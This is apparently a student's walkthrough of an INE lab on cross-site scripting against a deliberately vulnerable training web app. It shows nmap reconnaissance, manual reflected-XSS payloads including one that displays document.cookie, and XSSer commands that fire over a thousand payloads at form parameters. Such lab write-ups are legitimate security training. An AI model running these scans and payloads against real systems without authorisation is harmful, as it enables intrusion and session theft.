# Cross-site scripting -lab (INE-pentesting student path)

A target web application is available at http://demo.ine.local.

The objective: To perform an XSS attack on the target with the tool XSSer.

## Target info:

Host: http://demo.ine.local / 192.238.82.3

Open ports:
* 80    http
* 3306  MySQL 5.5.47 

OS: 
* Linux 4.15 - 5.6.
* Ubuntu 14.04.1

## 1. Scanning and footprinting the target

Ping the target host to check if it's online:

    ping demo.ine.local

The target responds and we get the ip address for the host: 192.238.82.3

Scan open ports with nmap:

    nmap -p- 192.238.82.3 >> nmap.txt

Found 2 open ports: 80 (http) and 3306 (mySQL). Check the version of mySQL service:

    nmap -p 3306 -sV 192.238.82.3

MySQL-version: 5.5.47. The scan also gives the Ubuntu version of the host: 14.04.1 

Detect OS running on the target:

    nmap -O 192.238.82.3 >> nmap.txt

Detected OS: Linux 4.15 - 5.6. 

## 2. Testing Reflected XSS exploits manually

Using the User Lookup (SQL) functionality found from OWASP 2017 > A7 Cross Site Scripting (XSS) > Via "Input" (GET/POST) > User info (SQL):

The value entered to the Name -field is shown in the results section as written. Wrapping input to common html tags shows that the input is evaluated as html. For example with \<i>test\</i> the input is reflected in italics and with \<h1>test\</h1> as a h1 header. 

Javascript can also be executed in the name field, for example \<script>alert(1);\</script> shows a pop-up as expected and \<script>alert(document.cookie);\</script> displays cookies in the pop-up. 

## 3.1 Testing with XSSer, POST requests

Using the DNS Lookup functionality as the target, get the request url and body with Burp Suite intercept and pass them to XSSer as --url and -p parameters. Replace the given input with XSS, so that XSSer can replace it with payloads:

    xsser --url "demo.ine.local/index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS"

XSSer confirms that the target is vulnerable to XSS attacks. Using the --auto option, test various built in payloads:

    xsser --url "demo.ine.local/index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --auto

The test tries 1291 different payloads, 1287 of which were successful. 

A custom payload can be used with the --Fp (Final payload) option and by defining the payload:

    xsser --url "demo.ine.local/index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --Fp "<script>alert(1);</script>"

The test confirms that the given payload works and gives final attack string that can be used as input by, for example, replacing the request body with it in Burp Suite. 

## 3.2 Testing with XSSer, GET requests

Using the User Poll as target, select any option and give initials. Intercept the request with Burp Suite and copy the url and request parameters to XSSer. Replace the value for user input with XSS for xsser to replace it with payloads:

    xsser --url "http://demo.ine.local" -g "/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=a&user-poll-php-submit-button=Submit+Vote"

The test shows that the target is vulnerable to XSS. Running the test with --auto option to test with various built-in payloads:

    xsser --url "http://demo.ine.local" -g "/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=a&user-poll-php-submit-button=Submit+Vote" --auto

The tries 1291 payloads, 1281 of which were successful. 

Testing a custom payload with the --Fp option:

    xsser --url "http://demo.ine.local" -g "/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=a&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1);</script>"

The test confirms that the target is vulnerable to the given payload. Copying the Final Attack string to a request intercepted by Burp Suite triggers the payload, as excepted. 
